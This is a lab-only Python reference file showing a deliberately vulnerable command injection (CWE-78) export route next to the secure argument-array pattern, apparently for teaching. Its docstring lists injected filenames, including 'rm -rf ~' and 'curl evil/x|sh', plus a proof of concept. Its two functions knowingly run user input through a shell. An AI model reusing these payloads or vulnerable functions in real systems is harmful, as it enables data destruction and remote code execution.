"""LAB-ONLY — Command Injection (CWE-78) VULNERABLE reference.

This is the *insecure* version of the export route, kept for the before/after
demo. The running app uses the secure version in app/files.py::export.

THE BUG
-------
The user-controlled `filename` is concatenated into a shell command string and
executed with shell=True. Shell metacharacters are interpreted:

    filename = "report.txt; rm -rf ~"          # command chaining
    filename = "report.txt && curl evil/x|sh"  # exfil / RCE
    filename = "$(whoami).txt"                  # substitution

PROOF OF CONCEPT (against our own localhost app only)
-----------------------------------------------------
    # vulnerable endpoint receives filename from the request:
    export_to_zip("a.txt; id > /tmp/pwned")
    # -> /tmp/pwned now contains the output of `id`  => arbitrary command exec
"""
import os
import subprocess


def export_to_zip_VULNERABLE(filename: str) -> int:
    # VULNERABLE: user input flows straight into a shell.
    cmd = f"zip /tmp/out.zip uploads/{filename}"
    return os.system(cmd)                      # <-- shell interpretation


def export_to_zip_VULNERABLE_subprocess(filename: str) -> bytes:
    # Equally VULNERABLE: shell=True re-introduces the shell.
    cmd = f"zip /tmp/out.zip uploads/{filename}"
    return subprocess.check_output(cmd, shell=True)   # <-- shell=True is the bug


# ---------------------------------------------------------------------------
# SECURE pattern (for reference — this is what app/files.py::export does):
#
#   cmd = ["zip", out_path, src_path]      # argument ARRAY, no shell
#   subprocess.run(cmd, shell=False, check=True, timeout=15)
#   # metacharacters in a filename are now inert literal argv values;
#   # additionally the format is chosen from an ALLOW-LIST, not free text.
# ---------------------------------------------------------------------------
